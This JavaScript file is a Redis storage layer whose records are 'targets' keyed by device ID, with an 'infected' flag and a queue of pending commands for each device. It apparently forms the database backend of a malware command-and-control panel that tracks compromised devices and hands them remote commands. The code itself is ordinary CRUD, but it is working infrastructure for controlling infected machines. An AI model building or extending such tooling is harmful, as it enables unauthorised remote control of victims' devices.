/**
 * FILE: lib/database.js
 * Wrapper Redis menggunakan library 'redis' standar (TCP/TLS).
 */

import { createClient } from 'redis';

let redisClient;

export const getRedisClient = async () => {
  if (!redisClient) {
    redisClient = createClient({
      url: process.env.REDIS_URL // Format: redis://default:password@host:port
    });
    redisClient.on('error', (err) => console.error('Redis Client Error', err));
    await redisClient.connect();
  }
  return redisClient;
};

export const saveTarget = async (deviceId, data) => {
  const client = await getRedisClient();
  const target = {
    deviceId,
    firstSeen: Date.now(),
    lastSeen: Date.now(),
    infected: false,
    commands: [],
    ...data
  };
  await client.set(`target:${deviceId}`, JSON.stringify(target));
  return target;
};

export const getTarget = async (deviceId) => {
  const client = await getRedisClient();
  const data = await client.get(`target:${deviceId}`);
  return data ? JSON.parse(data) : null;
};

export const getAllTargets = async () => {
  const client = await getRedisClient();
  const keys = await client.keys('target:*');
  const targets = [];
  for (const key of keys) {
    const data = await client.get(key);
    if (data) targets.push(JSON.parse(data));
  }
  return targets;
};

export const updateTarget = async (deviceId, updateData) => {
  const target = await getTarget(deviceId);
  if (!target) return null;
  
  const updated = { ...target, ...updateData, lastSeen: Date.now() };
  const client = await getRedisClient();
  await client.set(`target:${deviceId}`, JSON.stringify(updated));
  return updated;
};

export const deleteTarget = async (deviceId) => {
  const client = await getRedisClient();
  await client.del(`target:${deviceId}`);
};

export const saveCommand = async (deviceId, command) => {
  const cmd = {
    id: Date.now().toString(),
    deviceId,
    command,
    timestamp: Date.now(),
    status: 'pending'
  };
  const target = await getTarget(deviceId);
  if (target) {
    target.commands.push(cmd);
    await updateTarget(deviceId, { commands: target.commands });
  }
  return cmd;
};

export const getPendingCommand = async (deviceId) => {
  const target = await getTarget(deviceId);
  if (target && target.commands && target.commands.length > 0) {
    return target.commands[0];
  }
  return null;
};

export const deleteCommand = async (deviceId, commandId) => {
  const target = await getTarget(deviceId);
  if (target && target.commands) {
    target.commands = target.commands.filter(c => c.id !== commandId);
    await updateTarget(deviceId, { commands: target.commands });
  }
};
